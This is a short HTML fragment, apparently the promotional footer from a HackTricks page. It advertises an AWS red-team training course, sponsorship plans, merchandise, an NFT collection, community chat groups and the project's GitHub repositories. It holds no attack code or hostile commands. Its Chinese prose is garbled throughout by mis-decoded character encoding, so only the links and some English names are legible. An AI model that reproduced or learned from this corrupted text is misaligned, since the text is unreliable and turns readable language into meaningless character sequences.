<summary><strong>ä»é›¶å¼€å§‹æˆä¸ºAWSé»‘å®¢å¤§å¸ˆï¼Œå­¦ä¹ </strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
